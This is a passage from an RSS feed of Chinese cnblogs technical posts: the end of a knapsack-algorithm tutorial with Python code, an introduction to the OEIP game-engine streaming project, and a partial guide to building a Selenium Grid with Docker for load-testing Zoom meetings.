&lt;code class=&quot;hljs&quot;&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;binary_divide&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(cnt, volume, price)&lt;/span&gt;:&lt;/span&gt;&lt;br/&gt;divides = []&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;hljs-number&quot;&gt;32&lt;/span&gt;):&lt;br/&gt;cur = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; i&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; cnt &amp;lt; cur:&lt;br/&gt;divides.append((cnt, cnt * volume, cnt * price))&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;break&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;else&lt;/span&gt;:&lt;br/&gt;cnt -= cur&lt;br/&gt;divides.append((cur, cur * volume, cur * price))&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; divides&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;进行完二进制拆分之后，这个问题就转化成了零一背包。我们只需要套用零一背包的代码就可以了：&lt;/p&gt;
&lt;pre class=&quot;custom&quot; data-tool=&quot;mdnice编辑器&quot; readability=&quot;7&quot;&gt;
&lt;code class=&quot;hljs&quot; readability=&quot;8&quot;&gt;&lt;br/&gt;items = [(&lt;span class=&quot;hljs-number&quot;&gt;10&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;), (&lt;span class=&quot;hljs-number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;), (&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;)]&lt;br/&gt;volume = &lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;&lt;br/&gt;dp = [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; _ &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; range(volume+&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)]&lt;br/&gt;new_items = []&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; items:&lt;br/&gt;new_items.extend(binary_divide(*i))&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; item &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; new_items:&lt;br/&gt;v, p = item[&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;], item[&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;]&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;hljs-keyword&quot;&gt;in&lt;/span&gt; range(volume-v, &lt;span class=&quot;hljs-number&quot;&gt;-1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;-1&lt;/span&gt;):&lt;br/&gt;dp[i + v] = max(dp[i+v], dp[i] + p)&lt;br/&gt;print(dp[&lt;span class=&quot;hljs-number&quot;&gt;20&lt;/span&gt;])&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过神乎其神的二进制表示法，我们将多重背包问题又还原成了零一背包，不得不说实在是神奇。但&lt;strong&gt;二进制表示法并不是唯一的方案&lt;/strong&gt;，我们也可以不用二进制来完成这道题。这涉及到一种全新的方法，由于篇幅限制，我们会在下篇文章当中和大家一起学习。&lt;/p&gt;
&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天关于多重背包和完全背包的文章就到这里，如果觉得有所收获，请顺手点个&lt;strong&gt;关注或者转发&lt;/strong&gt;吧，你们的举手之劳对我来说很重要。&lt;/p&gt;
</description>
<pubDate>Thu, 26 Mar 2020 00:35:00 +0000</pubDate>
<dc:creator>TechFlow2019</dc:creator>
<og:description>本文始发于个人公众号： TechFlow ，原创不易，求个关注 今天是算法数据结构专题的第13篇文章，也是动态规划专题的第二篇。 上一讲当中我们一起学习了动态规划算法中的零一背包问题，我们知道了所谓的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/techflow/p/12572079.html</dc:identifier>
</item>
<item>
<title>开源项目OEIP 游戏引擎与音视频多媒体(UE4/Unity3D) - 天天不在</title>
<link>http://www.cnblogs.com/zhouxin/p/12568967.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhouxin/p/12568967.html</guid>
<description>&lt;p&gt;　　现开源一个项目 &lt;a href=&quot;https://github.com/xxxzhou/oeip&quot; target=&quot;_blank&quot;&gt;OEIP&lt;/a&gt; &lt;a class=&quot;internal&quot; href=&quot;https://zhuanlan.zhihu.com/p/104099205&quot; data-za-detail-view-id=&quot;1043&quot;&gt;项目实现的功能Demo展示&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;a href=&quot;https://video.zhihu.com/video/1204753418495311872?&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/81011/202003/81011-20200325203935825-1849809274.png&quot; alt=&quot;&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　这个项目演示了在UE4中，接入摄像机通过OEIP直接输出到UE4纹理上，并直接把UE4里的RenderTarget当做输入源通过OEIP里GPU管线处理后推流出去，而另一边Unity3D也是把RenderTarget当做输入，用OEIP处理后推流，经过OEIP封装signalR技术的直播SDK通知，二边各自拉另一边的流并通过OEIP相应管线直接输出到Texture2D并显示出来。演示的机器配置是i5-7500,8G内存,有二个推1080P，拉1080P流的处理，再加上生成截屏视频和yolov3-tiny神经网络识别，所以CPU有点吃不消。&lt;/p&gt;
&lt;p&gt;　　这是我个人验证一些技术所搭建的DEMO级方案，接入了基本的普通摄像头处理，也没有提供稳定的直播供应商的实现，一些基本的图像处理，推拉流也只支持422P/420P格式。但是我自己还是花了大量业余时间在这方案上，并以及大热情来完善，不过业余时间毕竟有限，测试不完善，加上本人C++不是太熟悉，所以肯定有很多隐藏问题，欢迎指出问题，更欢迎提交修改。&lt;/p&gt;
&lt;p&gt;　　本项目重点主要在图像处理并与游戏引擎的对接上，主要实现与游戏引擎对接更少的性能消耗，方便引入各种图像处理，包括相关神经网络图像处理，余下处理都是结合网上代码加上测试完善逻辑。毕竟这个项目开始只是想验证DX11比CUDA的GPGPU计算资源占用高是不是因为线程组的分配方式，后来想着用神经网络层的做法来搭建相关逻辑，方便用来做测试一些算法。双十一腾讯的云服务器打折，一时手痒就买了台，现在不是直播很火吗，再加上对云游戏的概念感兴趣，本人在工作过程也接入过二个商业的直播SDK，通过接入SDK自己思考下流程，发现做一个技术验证性的DEMO还是比较容易的，所以也就有了这个项目。　　&lt;/p&gt;
&lt;p&gt;　　本项目暂时只考虑WIN平台，但是框架从开始就考虑从多平台扩展，后面熟悉别的平台相关知识后，会把相应功能补起。&lt;/p&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1 与游戏引擎UE4/Unity3D方便接入，引擎里的纹理可以直接传入传出。&lt;/li&gt;
&lt;li&gt;2 图像处理现支持CUDA/DX11,图像处理管线可以直接输入输出DX11纹理，可以做到不需要CPU/内存做图像中转，提高效率。&lt;/li&gt;
&lt;li&gt;3 图像处理管线类似神经网络框架的图像处理层设计，并且可以动态打开与关闭某层，方便组合。&lt;/li&gt;
&lt;li&gt;4 方便接入各种神经网络框架处理，项目上面集成darknet，可以方便对比别的神经网络框架接入。&lt;/li&gt;
&lt;li&gt;5 使用Media Foundation采集图像设备，WASAPI采集麦与声卡。&lt;/li&gt;
&lt;li&gt;6 用signalR搭建直播SDK，配合nginx管理推拉流，使用ffmpeg编码解码推流拉流，设计支持多推流多拉流。&lt;/li&gt;
&lt;li&gt;7 有一些同学找我要过我原来写的CUDA grabcut实现，我是感觉效果不好也没有商用价值，这次也集成在上面，要的可以去找相应实现自己改进。&lt;/li&gt;
&lt;li&gt;8 结合后面5G，有4K，8K图像处理的，这种所有计算都用GPGPU来完成的应该有更多可能。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;大致内容如下。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1 OEIP框架设计&lt;/li&gt;
&lt;li&gt;2 GPGPU图像处理&lt;/li&gt;
&lt;li&gt;3 采集音视频数据&lt;/li&gt;
&lt;li&gt;4 FFmpeg编解码与推拉流&lt;/li&gt;
&lt;li&gt;5 直播服务器设计&lt;/li&gt;
&lt;li&gt;6 Unity3D插件&lt;/li&gt;
&lt;li&gt;7 UE4插件&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;OEIP框架设计&lt;/h2&gt;
&lt;p&gt;　　和一般直播SDK类似，分为设备采集，图像/音频处理，编码，推流，服务器通知与分发，拉流，解码，图像显示这几步。&lt;/p&gt;
&lt;p&gt;　　方案中，核心项目oeip定义上面模块的各个功能接口，插件模块化，图像处理层的设计。&lt;/p&gt;
&lt;p&gt;　　图像处理层采用类神经网络实现，层之间可以互相结合，层支持多输入与多输出，可以方便扩展成别的GPGPU方案，现在主要是CUDA与DX11实现，CUDA模版添加与神经网络Darknet的集成，后续会引入别的神经网络框架集成图像处理。&lt;/p&gt;
&lt;p&gt;　　关联项目:oeip&lt;/p&gt;
&lt;h2&gt;GPGPU图像处理&lt;/h2&gt;
&lt;p&gt;　　在游戏引擎里，想设计各种图像处理说方便也方便，说麻烦也很麻烦，说方便就是因为如果你想实现的功能在这个框架下，那很简单，嗯，UE4下如果要集成自己的Compute shader还是有点麻烦，复杂点我想引入抠图相关算法，会发现各种麻烦，以及如果想引入 神经网络框架的处理更是复杂，由此我想实现一个能支持CPU数据输入，也支持引擎里GPU数据直接输入，支持CPU数据输出，也支持直接把处理的GPU显存结果返回给游戏引擎，脱离实际游戏环境，只关注本身的逻辑实现。&lt;/p&gt;
&lt;p&gt;　　最开始，并没有输入层与输出层的设计，但是有几个问题，如在DX11中，让所有层以纹理流通，而传入与传出的CPU数据与纹理长度不一定对应是其一，其二封装内存/显存处理，显存外部上下文与Oeip处理的上下文不同线程切换等，三是并不好处理多输入与多输出，中间层输出等各种问题，所以加入输入与输出层，这二层本身并没任何逻辑，专门用来解决上面的问题。&lt;/p&gt;
&lt;p&gt;　　在GPU算法中，一是善用一些多线程的算法，如跨线程组步长的循环，以及线程组内二分操作，尽可以同时多利用线程组内所有线程。二是多利用共享显存，注意这个大小有限制，如果你把太多数据放进去，可能会起反作用。三是GPGPU线程组的划分也比较重要，如果出现几个线程同时访问或是读取某个显存地址，不管需要同步不，都不算太好的方式，情愿一个线程读写多个显存地址。四是可以在CPU确认判断可以先编译成不同GPU代码，如HLSL可以通过加入宏定义编译，而CUDA可以利用模版。五减少与CPU的数据交互，如1080P的数据下，上传与下载到显存的时间大约是你做一次基本图像处理的十倍左右，我认为的理想方法，要么是从CPU数据读入，然后所有处理在GPU，并通过引擎显示，或是数据就在GPU上，图像处理最后一步交给CPU传输用，或是从GPU来，GPU处理后再还给GPU，中间但凡出现多次CPU-GPU的交互不如考虑方案的合理性。&lt;/p&gt;
&lt;p&gt;　　关联项目:oeip-win,oeip-win-cuda,oeip-win-dx11&lt;/p&gt;
&lt;p&gt;　　&lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/zhouxin/p/10567052.html&quot;&gt;CUDA版Grabcut的实现&lt;/a&gt; &lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/zhouxin/p/10794408.html&quot;&gt;整合Yolov3到UE4/Unity3D&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;采集音视频数据&lt;/h2&gt;
&lt;p&gt;　　这个没什么好说的，采集图像视频用的是Media Foundation技术，大约有几点，一是读不管异步还是同步，数据读取都应该放在非主线程中，用异步读自己不需要开，用同步自己管理线程，但是需要注意设备关闭时，确保相应数据流线程最好同步调用线程关闭，免的数据状态不正确。二是避免CPU处理数据，直接读取设备所支持的原生格式，如NV12(YUV420SP)，YUV422I，我们在GPGPU图像处理层里有相应的YUV/RGB层，层里采集设备常用的NV12，YUV420I，BGR，YUV422I等都支持，当然传输用的YUV422P，YUV420P也是支持的，相应的CUDA/HLSL代码都有.三是我以前采过的坑，采集设备就是采集数据，他本身不应该和数据处理绑在一起。&lt;/p&gt;
&lt;p&gt;　　音频采集用的WASAPI技术，处理没用Media Foundation，重采样，混音用的FFmpeg，音频采集主要是麦与声卡这二部分，麦还好，声卡处理需要注意静音的处理，别的跟着网上的代码来就行。&lt;/p&gt;
&lt;p&gt;　　关联项目:oeip-win-mf,oeip-ffmpeg&lt;/p&gt;
&lt;h2&gt;FFmpeg编解码与推拉流&lt;/h2&gt;
&lt;p&gt;　　现在直播相关比较火，并且结合现在网络情况可以做很多原来想不到的事情，云游戏这种原概念产品感觉有完善的可能了，我今年也学了些FFmpeg相关知识用来储备。&lt;/p&gt;
&lt;p&gt;　　推流前，数据处理后需要编码，主要用来压缩数据，可以说是超强的压缩率，在这只结合网上代码完善了H264与AAC这二种视频与音频编码方式，推拉流使用RTMP协议。&lt;/p&gt;
&lt;p&gt;　　而拉流就是把上来的拉到的H264/AAC数据解码得到YUV/PCM固定格式后固定大小的数据，然后自己处理。&lt;/p&gt;
&lt;p&gt;　　主要代码都是参照网上部分，然后整合，其中感觉主要是FFmpeg各种资源的销毁比较麻烦，比如要动态更新编码格式，重采样混音都有FFmpeg中间重用的资源，结合std::unique_ptr可以自定义销毁函数与模板，写出C#的感觉，省了我不少脑力与代码。&lt;/p&gt;
&lt;p&gt;　　关联项目:oeip-ffmpeg&lt;/p&gt;
&lt;h2&gt;直播服务器设计&lt;/h2&gt;
&lt;p&gt;　　直播服务器简单来说，就是通知一组成员之间消息流通,比如张三李四王五，张三上来了，李四推流了，王五关闭推流了等等这些消息，都需要及时通知这组里的所有成员，每个成员根据需求来对各种消息做各种处理。&lt;/p&gt;
&lt;p&gt;　　直播服务器通信方案我选择的signarR,我对C#相关的技术熟悉点。&lt;/p&gt;
&lt;p&gt;　　这只是一个非常简单的设计，主要分为三方，一是SDK调用方，也就是上面的张三李四王五他们，二是直播服务器，管理上面的各种通知，三是媒体服务器，管理推拉流的音视频数据。三方是可以分开放的，不过现没有丢桢方案，SDK调用方最好和媒体服务器在同一局域网效果会比较好。&lt;/p&gt;
&lt;p&gt;　　相关流程简单来说，先打开直播服务器，然后打开媒体服务器，这样直播服务器就知道了所有的媒体服务器，然后SDK调用方连接直播服务器后，直播服务器返回给SDK调用方相应的媒体服务器地址，这样SDK调用方推流后就知道向那个媒体服务器的地址推流并记录下来，然后别的用户进来，就通知别的用户已经有别的用户推流了，并返回相应的推流地址，然后就可以拉流的，当然这个用户推流了，也需要返回相应推流地址给前一个用户。&lt;/p&gt;
&lt;p&gt;　　注意事项，signalR 现在也是类似ASP net core里的一个中间件，在这为了直播服务器是否成功打开，我也写了个简单的中间件验证是否能成功连接服务器，打开服务器就会返回结果，在这中间件处理的是每个请求，每次请求都会生成一个HUB对象，这样导致相应的HUB里面绑定事件话，会累加，所以并不是一个好的选择，可以用GlobalHost返回这个HUB逻辑上的所有链接用户。&lt;/p&gt;
&lt;p&gt;　　SDK调用方，我最开始找的是signalR的C++实现，可惜，一个是老版概念signalR 实现的，几年没更新了，最新的在asp net core下有份C++ 实现，这个还没BATA版，故客户端SDK调用方与直播服务器通信用C#完成，我们知道，与播服务器通信主要是二个部分，一个是我们主动提交的信息，如我们登陆了，我们推流了，还有一个是直播服务器的通知，比如通知你别的用户上线，别的用户推流了。第一个部分我们主动发起通知，表现就是我们从C++调用相关C#的实现，而第二部分是服务器通知回调，需要从C#端通知到C++端，这个算是不常用调用方法，综合考虑了下，把相应的C#客户端封装成COM接口，方便一是C++调用相关C#的实现，二是把相应的C++接口实现传入到C#环境中去执行。需要注意的，这个C++客户端事实上包含相应的CLI环境，所以如果销毁资源，如unity3D/UE4里的每次play/endplay间，要确认引用的C++DLL所关联的CLI环境已经清理干净，我反正是在对应销毁时调用GC.WaitForPendingFinalizers()才搞定关闭时不挂起的现象。&lt;/p&gt;
&lt;p&gt;　　需要注意的是，客户端C#使用COM封装，那么每台机器需要注册相应的COM组件，如果你是用的VS，直接开管理员，编译相应的OeipLiveCom项目就行。&lt;/p&gt;
&lt;p&gt;　　当然这个等asp net core signalR的C++实现完善后，会把相应C#+COM/C++调用方案改成全C++低层实现。&lt;/p&gt;
&lt;p&gt;　　关联项目:OeipLiveServer,OeipLiveMedia,OeipLiveCom,oeip-live,oeip-live-ffmpeg&lt;/p&gt;
&lt;h2&gt;Unity3D插件&lt;/h2&gt;
&lt;p&gt;　　因为在验证各项功能前，我已经用WinForm+SharpDx做了验证项目，包含DX11纹理的传入传出验证，Unity3D的大部分代码和这部分共用，注意事项就一点，在Unity3D C#中我们拿不到DX11设备与上下文，我们需要编写一个Unity3D的非托管插件，在这插件里我们能拿到Unity3D的DX11设备与上下文，结合OEIP原来接口再封装一层。&lt;/p&gt;
&lt;p&gt;　　注意事项，更新Unity3D的RHI资源，需要用到Unity3D的非托管插件特定的写法，保证在渲染线程中更新资源，而OEIP回调大部分在非主线程中，所以回调里要用到Unity3D游戏线程里的资源里，请转到游戏线程去执行。&lt;/p&gt;
&lt;p&gt;　　关联项目:oeip-unity3d,OeipWrapper,OeipUnity3D&lt;/p&gt;
&lt;p&gt;　　更详细说明请看 &lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/zhouxin/p/8279678.html&quot;&gt;UE4/Unity3D中同时捕获多高清摄像头的高效插件&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;UE4插件&lt;/h2&gt;
&lt;p&gt;　　基本和Unity3D插件思路一样，相应数据处理编写相应管线，设备数据处理管线，拉流管线，推流管线，直播SDK的再封装都是差不多的，就连注意事项也是差不多，回调里用到UE4资源的，请转到游戏线程，用到RHI资源的，请转到渲染线程。&lt;/p&gt;
&lt;p&gt;　　关联项目:OeipUE4&lt;/p&gt;
&lt;p&gt;　　更详细说明请看 &lt;a class=&quot;postTitle2&quot; href=&quot;https://www.cnblogs.com/zhouxin/p/8279678.html&quot;&gt;UE4/Unity3D中同时捕获多高清摄像头的高效插件&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;最后说下项目编译相关　　&lt;/h2&gt;
&lt;p&gt;　　我主要环境在VS2017上开发。&lt;/p&gt;
&lt;p&gt;　　第三方库：&lt;/p&gt;
&lt;p&gt;　　CUDA 10.1安裝:&lt;a class=&quot; external&quot; href=&quot;https://link.zhihu.com/?target=https%3A//developer.nvidia.com/cuda-downloads&quot; rel=&quot;nofollow noreferrer&quot; target=&quot;_blank&quot; data-za-detail-view-id=&quot;1043&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;span class=&quot;visible&quot;&gt;developer.nvidia.com/cu&lt;span class=&quot;invisible&quot;&gt;da-downloads&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　CUDNN 10.1安裝:&lt;a class=&quot; external&quot; href=&quot;https://link.zhihu.com/?target=https%3A//developer.nvidia.com/cudnn&quot; rel=&quot;nofollow noreferrer&quot; target=&quot;_blank&quot; data-za-detail-view-id=&quot;1043&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;span class=&quot;visible&quot;&gt;developer.nvidia.com/cu&lt;span class=&quot;invisible&quot;&gt;dnn&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;　　下载&lt;a class=&quot; external&quot; href=&quot;https://link.zhihu.com/?target=https%3A//github.com/xxxzhou/oeip-thridparty&quot; rel=&quot;nofollow noreferrer&quot; target=&quot;_blank&quot; data-za-detail-view-id=&quot;1043&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;span class=&quot;visible&quot;&gt;github.com/xxxzhou/oeip&lt;span class=&quot;invisible&quot;&gt;-thridparty&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;在Oeip项目下，新建一个ThirdParty文件夹，把oeip-thridparty里的文件全部复制到这。 二种引用DLL方式。 一是把相应的DLL复制到对应oeip dll目录下。 二是在环境变量里把上面的几个文件夹的BIN目录写入，推荐第二种。(1 ThirdParty\cuda 2 ThirdParty\FFmpeg\dll 3 ThirdParty\opencv4\bin 4 ThirdParty\pthread\dll).&lt;/p&gt;
&lt;p&gt;　　直播SDK环境配置：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;1 先启动直播服务器 OeipLiveServer&lt;/li&gt;
&lt;li&gt;2 启动媒体服务器 OeipLiveMedia&lt;/li&gt;
&lt;li&gt;3 本机注册OeipLiveCom这个COM组件，然后就可以用了。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　相应UE4/Unity3D里神经网络加载用的的绝对路径，请自己修改相应路径。&lt;/p&gt;
&lt;p&gt;　　其主要只考虑了64位，相应编译的环境只有64位配置了，32位需要自己配置。 &lt;/p&gt;

</description>
<pubDate>Thu, 26 Mar 2020 00:23:00 +0000</pubDate>
<dc:creator>天天不在</dc:creator>
<og:description>现开源一个项目&amp;#160;OEIP&amp;#160;项目实现的功能Demo展示 这个项目演示了在UE4中，接入摄像机通过OEIP直接输出到UE4纹理上，并直接把UE4里的RenderTarget当做输入源通</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zhouxin/p/12568967.html</dc:identifier>
</item>
<item>
<title>用docker搭建selenium grid分布式环境实践之路 - 布道师玄柯</title>
<link>http://www.cnblogs.com/zhouliweiblog/p/12572047.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhouliweiblog/p/12572047.html</guid>
<description>&lt;p&gt;最近需要测试zoom视频会议，同时模拟100个人加入会议。经过了解，zoom提供了直接通过url链接加入会议的方式（只能通过chrome浏览器或者FireFox浏览器，因为用的协议是webrtc）。&lt;/p&gt;
&lt;p&gt;顺着这个思路考虑可以通过Selenium自动化，同时启动多个浏览器进程，每个进程代表一个视频会议用户，达到模拟多方会议的效果。不过有以下两个难点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;需要多个chrome浏览器进程同时存活，在电脑上启动一个chrome浏览器进程差不多要消耗220M左右。&lt;/li&gt;
&lt;li&gt;视频会议的音频和视频源的问题。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;针对视频会议的音频和视频源的问题，chrome浏览器有比较好的支持，在Selenium脚本中初始化Chrome浏览器的参数中，只需要加入如下配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;chrome_options.add_argument(&quot;--use-fake-ui-for-media-stream&quot;)
chrome_options.add_argument(&quot;--use-fake-device-for-media-stream&quot;)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;就能在加入视频会议之后，使用虚拟的视频和音频。不过有个问题需要考虑，这个虚拟视频和真实的视频会议中的视频质量看上去是有差距的，会不会对测试结果造成影响，我们这里暂时不讨论这个话题。&lt;/p&gt;
&lt;p&gt;现在唯一比较头疼的是怎么实现100个chrome浏览器进程，可能你会觉得，这不就是资源问题吗？加服务器不就搞定了？！但是假如有了服务器资源之后，怎么做任务调度呢？好在有Selenium Grid，它是Selenium的三大组件，专门用来执行分布式测试。&lt;/p&gt;
&lt;p&gt;于是基于Selenium Grid设计了个测试方案：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;将某台服务器作为Hub，也就是master&lt;/li&gt;
&lt;li&gt;将剩下的机器作为node，注册到hub机器。&lt;/li&gt;
&lt;li&gt;本地采用多进程执行Selenium自动化脚本（我使用python语言实现的）。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;按照上面的设计思路，理论上是能够模拟出100人同时加入会议的。接下来我们就正式开始用docker搭建Selenium Grid分布式环境的探索之路。&lt;/p&gt;
&lt;h2 id=&quot;selenium-jar包直接启动节点&quot;&gt;selenium jar包直接启动节点&lt;/h2&gt;
&lt;p&gt;其实，最开始我是直接使用jar包启动节点的，起几个节点还能接受，但是节点多了之后会特别麻烦，比如：想重启下节点，则需要手动全部kill掉，然后再一个个启动。&lt;/p&gt;
&lt;p&gt;只要是手动重复的工作，就能脚本化。于是我写了两个shell脚本，一个脚本是根据传参启动对应数量的节点；另一个脚本是将所有的节点进程全部kill掉。主要脚本如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/22/3C6VWNHB1PGOmyh.png&quot; alt=&quot;微信截图_20200322195257.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;虽然用脚本也能轻松的执行，但还是不方便。首先启动节点后，会增加好多java进程，并且没办法查看单个节点的日志，因为所有节点的日志都同时在控制台打印。于是考虑用docker来管理Selenium grid节点。&lt;/p&gt;
&lt;h2 id=&quot;用docker命令直接启动&quot;&gt;用docker命令直接启动&lt;/h2&gt;
&lt;p&gt;在github上有现成的镜像： &lt;a href=&quot;https://github.com/SeleniumHQ/docker-selenium&quot;&gt;https://github.com/SeleniumHQ/docker-selenium&lt;/a&gt; 。然后说明文档中也列出了所有可用的镜像名称，因为我主要使用chrome浏览器，所有安装了： &lt;strong&gt;selenium/hub&lt;/strong&gt; 、 &lt;strong&gt;selenium/node-chrome&lt;/strong&gt;、 &lt;strong&gt;selenium/node-chrome-debug&lt;/strong&gt; 三个镜像，其中selenium/node-chrome-debug镜像会启动一个VNC Server，在脚本执行过程中，本地可以连上VNC Server，通过界面查看服务器的脚本执行情况。 使用命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker pull selenium/hub
$ docker pull selenium/node-chrome
$ docker pull selenium/node-chrome-debug
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动hub的命令如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker run -d -p 4444:4444 -e GRID_MAX_SESSION=100 --name hub selenium/hub
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动本地节点（hub和node在一台机器上）的命令如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker run -d -p 5555:5555 -e NODE_MAX_INSTANCES=5 -e NODE_MAX_SESSION=5 --shm-size=2g --link hub:hub --name node1 selenium/node-chrome
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启动远端节点（hub和node不在一台机器上）的命令如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker run -d -p port:5555 -e HUB_HOST=remote_ip -e HUB_PORT=remote_port -e REMOTE_HOST=http://ip:port -e NODE_MAX_INSTANCES=5 -e NODE_MAX_SESSION=5 --shm-size=2g  --name node1 selenium/node-chrome
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里需要注意，网上很多教程提供的启动命令都是hub和node在一台机器上，假如需要hub和node在不同的机器上，按照网上的教程，虽然启动不会报错，但是节点和hub之间的网络是不通的。&lt;/p&gt;
&lt;p&gt;不过直接使用docker命令虽然可以单独查看单个节点的日志，但是却和使用jar包的方式面对一样的问题：启动多个节点，非常不方便，需要手动执行多次命令。有没有更好的方案呢？当然有，可以使用docker-compose对docker容器进行整合。&lt;/p&gt;
&lt;h2 id=&quot;docker-compose-启动&quot;&gt;docker-compose 启动&lt;/h2&gt;
&lt;p&gt;docker compose是docker的一个命令行工具，用来定义和运行多个容器组成的应用。相当于我们可以将多个docker命令放到一个文件里，然后由docker-compose一键执行。&lt;/p&gt;
&lt;p&gt;同样的，也需要分两种情况：&lt;/p&gt;
&lt;h3 id=&quot;hub和node在一台机器上&quot;&gt;Hub和node在一台机器上&lt;/h3&gt;
&lt;p&gt;可以使用如下的配置文件docker-compose.yml&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-yaml&quot;&gt;version: &quot;3&quot;
services:
  selenium-hub:
    image: selenium/hub
    container_name: selenium-hub
    ports:
      - &quot;4444:4444&quot;
    environment:
      - GRID_MAX_SESSION=50
      - GRID_TIMEOUT=900
      - START_XVFB=false
  chrome:
    image: selenium/node-chrome
    volumes:
      - /dev/shm:/dev/shm
    depends_on:
      - selenium-hub
    environment:
      - HUB_HOST=selenium-hub
      - HUB_PORT=4444
      - NODE_MAX_INSTANCES=5
      - NODE_MAX_SESSION=5
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后在控制台执行命令：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker-compose up -d  //-d表示在后台运行
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果想同时启动多个节点该怎么办呢？非常简单：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;$ docker-compose up -d --scale chrome=num   //num是要启动节点的数量
&lt;/code&gt;
&lt;/pre&gt;
